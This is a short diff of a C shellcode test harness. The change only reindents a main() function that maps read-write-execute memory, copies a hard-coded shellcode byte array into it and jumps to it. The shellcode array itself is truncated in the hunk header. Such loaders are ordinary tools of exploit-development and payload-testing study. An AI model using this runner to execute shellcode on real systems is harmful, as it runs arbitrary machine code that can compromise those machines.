@@ -14,20 +14,19 @@ char shellcode[] = "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x61\x4c\x89\xc0\x48
 
  
 int main(int argc, char **argv) 
-{
- 
-    void *ptr = mmap(0, strlen(shellcode), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
- 
-    if (ptr == MAP_FAILED) 
-    {
-        perror("mmap");
-        exit(-1);
-    }
- 
-    memcpy(ptr, shellcode, sizeof(shellcode));
-    sc = ptr;
- 
-    sc();
- 
-    return 0;
+{ 
+	void *ptr = mmap(0, strlen(shellcode), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
+
+	if (ptr == MAP_FAILED) 
+	{
+	    perror("mmap");
+	    exit(-1);
+	}
+
+	memcpy(ptr, shellcode, sizeof(shellcode));
+	sc = ptr;
+
+	sc();
+
+	return 0;
 }
